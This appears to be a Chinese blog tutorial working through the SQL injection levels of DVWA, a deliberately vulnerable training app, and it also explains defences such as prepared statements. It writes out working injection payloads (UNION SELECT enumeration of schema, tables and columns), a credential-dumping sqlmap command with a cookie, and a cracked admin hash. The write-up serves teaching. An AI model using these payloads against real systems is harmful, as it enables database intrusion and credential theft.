title: DVWA练习3-SQL注入
date: 2016-03-02 22:44:13
categories: 安全
tags: [Web安全,SQL注入]
---

### 一、SQL注入
#### 1.简介
所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。
<!--more-->
#### 2.类别危害
SQL注入根据数据库的不同，有asp+mssql和php+mysql几种，有盲注，回显式注入等。
SQL注入危害很大，可以数据库中重要信息，获取webshell等。
#### 3.防范
参考wooyun wiki：
使用参数检查的方式，拦截带有SQL语法的参数传入应用程序
使用预编译的处理方式处理拼接了用户参数的SQL语句
在参数即将进入数据库执行之前，对SQL语句的语义进行完整性检查，确认语义没有发生变化
在出现SQL注入漏洞时，要在出现问题的参数拼接进SQL语句前进行过滤或者校验，不要依赖程序最开始处防护代码
定期审计数据库执行日志，查看是否存在应用程序正常逻辑之外的SQL语句执行

其实就是对用户输入的数据进行检查过滤，使用参数化语句，是代码和数据分离。

### 二、DVWA练习
#### 1.low
源码：
```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i < $num ) {
        // Get values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";

        // Increase loop count
        $i++;
    }

    mysql_close();
}
?>
```
接收用户输入的id值，在将其放入查询语句中，查询正确则返回结果，否则显示错误。其中没有任何过滤.
此处可以看到查询为字符型，而不是数字型。尝试输入1' or '1'='1，遍历数据库表，则查询语句为
`SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';`
可以看到结果为
![Alt text](http://7xo8y2.com1.z0.glb.clouddn.com/57(WM%5B1%24VR%5BI3YX%5DS%4068%25G0.png)
接下来进行注入。
查询字段数：order by x
当输入数字为3时，错误，说明此处查询的字段为2。可以参考https://segmentfault.com/a/1190000002655427
字段位置：-1' union select 1,2--
结果有1，2。可以在将数字替换。
查询数据库名称：-1' union select database(),2--
结果为 dvwa。
猜解表名：-1' union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x64767761--
这之中0x64767761为数据库（十六进制），即dvwa转换为hex。
结果为：
![Alt text](http://7xo8y2.com1.z0.glb.clouddn.com/4FRINC6ON5VI%40709688US.png)
其中有两个表，需要查询的是user表。
猜解列名：
-1' union select 1,column_name from information_schema.columns where table_name=0x7573657273--
此处0x7573657273为users转换为16进制。
结果为
![alt text](http://7xo8y2.com1.z0.glb.clouddn.com/caijieleiming.png)
其中user和password为用户和密码列。
查询内容：
-1' union select user,password from users --
可以看到结果为
![alt text](http://7xo8y2.com1.z0.glb.clouddn.com/jieguo.png)
用户admin的密码hash值为5f4dcc3b5aa765d61d8327deb882cf99，破解出密码是password。

#### 2.Medium
源码：
```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysql_real_escape_string( $id );

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i < $num ) {
        // Display values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";

        // Increase loop count
        $i++;
    }

    //mysql_close();
}

?>
```
Medium级别没有输入框，使用复选框来输入，$_POST接收输入。
mysql_real_escape_string()函数过滤特殊字符，但是在这里并不能完全过滤，所以仍然可以注入。
这里可以使用代理工具修改数据进行注入，使用burp代理，如图。
![](http://7xo8y2.com1.z0.glb.clouddn.com/mediumburp.png)
修改为 id=2 or 1=1&Submit=Submit,遍历表单。这里是数字型注入，与字符型注入略不同，其余过程一样。
结果如图
![](http://7xo8y2.com1.z0.glb.clouddn.com/mediumjieguo.png)

#### 3.High
源码：
```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
   // Get input
   $id = $_SESSION[ 'id' ];

   // Check database
   $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
   $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' );

   // Get results
   $num = mysql_numrows( $result );
   $i   = 0;
   while( $i < $num ) {
       // Get values
       $first = mysql_result( $result, $i, "first_name" );
       $last  = mysql_result( $result, $i, "last_name" );

       // Feedback for end user
       echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";

       // Increase loop count
       $i++;
   }

   mysql_close();
}

?>
```
这里和low级别相似，但是是在另一个页面中，使用$_SESSION保存数据。
输入 -1' or '1'='1'--  遍历表
直接输入 -1' union select user,password from users --即可得到结果。
PHP session的作用其实很简单它可以把用户提交的数据以全局变量形式保存在一个session中并且会生成一个唯一的session_id，这样就是为了多了不会产生混乱了，并且session中同一浏览器同一站点只能有一个session_id。
#### 4.Impossible
源码：
```PHP
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();
?>
```
这是使用checkToken防止CSRF攻击，is_numeric函数判断是否为数字，防止输入非法数据，并且代码和数据分离，防止了SQL注入。

#### 5.SQL盲注
普通注入与盲注的区别：普通注入是会显示一些错误信息在页面上给攻击者判断，也就是说它会有多种情况，从而方便攻击者。而盲注则是只有两种情况，即TRUE和FALSE，这样说并不是很准确，因为SQL查询无非就这两种情况，应该说是盲注的时候你只能得到一个正常的页面或者是什么页面的不存在，甚至你在查询表的记录过程也不会有显示。
可以参考[mysql盲注](http://seeicb.com/2016/05/27/mysql盲注/)
使用sqlmap, python sqlmap.py -u "http://192.168.10.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8i4q6vgdtu106rsqntlmhihpr6" -D dvwa -T users-C user,password --dump
可得到结果。

#### 6.其它
网上一些关于SQL注入的介绍。
http://www.cnblogs.com/aix1314/archive/2013/03/31/2991609.html
http://wayne173.iteye.com/blog/1457634
http://www.cnblogs.com/tanshuicai/archive/2010/02/03/1664900.html
http://www.2cto.com/Article/201403/286400.html
